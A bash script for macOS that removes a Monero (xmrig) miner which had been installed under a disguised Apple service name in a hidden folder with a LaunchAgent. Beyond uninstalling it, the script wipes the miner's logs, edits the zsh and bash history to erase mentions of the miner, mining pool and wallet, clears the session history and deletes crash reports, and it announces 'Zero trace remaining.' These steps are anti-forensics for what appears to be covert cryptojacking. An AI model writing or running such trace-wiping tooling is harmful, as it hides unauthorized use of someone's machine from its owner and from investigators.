#!/usr/bin/env bash
# ============================================================
# remove_xmr.sh — Zero-trace removal of XMR miner
# ============================================================

DISGUISE_NAME="com.apple.coremedia.network"
INSTALL_DIR="$HOME/Library/Application Support/.cmnd"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"

echo ""
echo "=========================================="
echo " XMR Miner — Full Removal"
echo "=========================================="

echo "[1/6] Stopping miner process..."
launchctl bootout "gui/$(id -u)" "$PLIST_PATH" 2>/dev/null || true
launchctl unload -w "$PLIST_PATH" 2>/dev/null && echo "      ✓ LaunchAgent unloaded" || echo "      — Not loaded"
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null && echo "      ✓ Process killed" || echo "      — Not running"
pkill -9 -f "xmrig" 2>/dev/null || true
sleep 1

echo "[2/6] Removing binary + config..."
[[ -d "$INSTALL_DIR" ]] && rm -rf "$INSTALL_DIR" && echo "      ✓ $INSTALL_DIR deleted" || echo "      — Not found"

echo "[3/6] Removing plist..."
[[ -f "$PLIST_PATH" ]] && rm -f "$PLIST_PATH" && echo "      ✓ Plist deleted" || echo "      — Not found"

echo "[4/6] Wiping logs..."
rm -f "$LOG_PATH" && echo "      ✓ Log wiped" || echo "      — No log found"

echo "[5/6] Scrubbing shell history..."
for HIST in "$HOME/.zsh_history" "$HOME/.bash_history"; do
  [[ -f "$HIST" ]] && sed -i '' '/mine_xmr\|xmrig\|coremedia\.network\|supportxmr\|45yWnSb/d' "$HIST" 2>/dev/null && echo "      ✓ $HIST cleaned"
done
history -c 2>/dev/null || true

echo "[6/6] Removing crash reports..."
find "$HOME/Library/Logs/DiagnosticReports" \( -name "*xmrig*" -o -name "*coremedia.network*" \) -delete 2>/dev/null
echo "      ✓ Done"

echo ""
echo "=========================================="
[[ ! -d "$INSTALL_DIR" && ! -f "$PLIST_PATH" && ! -f "$LOG_PATH" ]] \
  && echo " ✓  Complete — Zero trace remaining." \
  || echo " [!] Some files may remain — check manually."
echo "=========================================="
echo ""
